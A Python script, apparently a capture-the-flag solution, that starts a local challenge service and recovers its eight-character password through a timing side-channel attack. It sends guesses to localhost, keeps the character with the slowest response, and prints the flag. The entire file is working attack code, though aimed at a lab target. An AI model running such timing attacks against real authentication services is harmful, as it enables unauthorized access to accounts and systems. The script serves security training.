# Written by: Nitay Yehezkely

# ------------------------------------------------- Imports and constants Section ----------------------

import socket, os, time

BUFFER_SIZE = 10000
SIZE = 1000


# ------------------------------------------------- Functions Section -----------------------------------

def make_pass(str):
    """
    The function get a string (less then eight characters) and fill it with *.
    e.g.: ny - > ny******, ABCD -> ABCD****
    :param str: The string
    :return: 
    """
    if len(str) < 8:
        for i in range(8 - len(str)):
            str += '*'
    return (str)


def send_pass(str):
    """
    The function sends to the server 'str' and returns the time to response (the first parameter) and the what
     the server sends.
     If it found the flag it prints it.
    :param str: The password.
    :return: time to response, the response.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 1234))
    data = s.recv(BUFFER_SIZE)
    s.send(bytes(str, 'utf8'))
    m1 = int(round(time.clock() * SIZE))
    data = s.recv(BUFFER_SIZE)
    data = data.decode('utf8')
    m2 = int(round(time.clock() * SIZE))
    flag = "f"
    if data == "f":
        # If we found the password we will print the flag.
        while len(data) != 0:
            data = s.recv(BUFFER_SIZE)
            flag += data.decode('utf8')
        print("The flag is: " + flag)
    s.close()
    return (m2 - m1, flag)


# ------------------------------------------------- Main Section -----------------------------------
# Making a list with all the possible chars:
r = list(range(65, 91))
t = list(range(97, 123))
s = list(range(48, 58))
for i in t:
    r.append(i)
for i in s:
    r.append(i)
ch = []
for i in r:
    ch.append(chr(i))


os.startfile("SecureFlagService.exe") #opening the server
password = ""
a = []
for r in range(8):
    print("At letter ", r + 1, "...")
    max = 0
    c_max = None
    for c in ch:
        t, f = send_pass(make_pass(password + c))
        if t > max:
            max = t
            c_max = c
        if f != 'f':
            print("The password is: " + password + c)
    password += c_max

# End-Of-File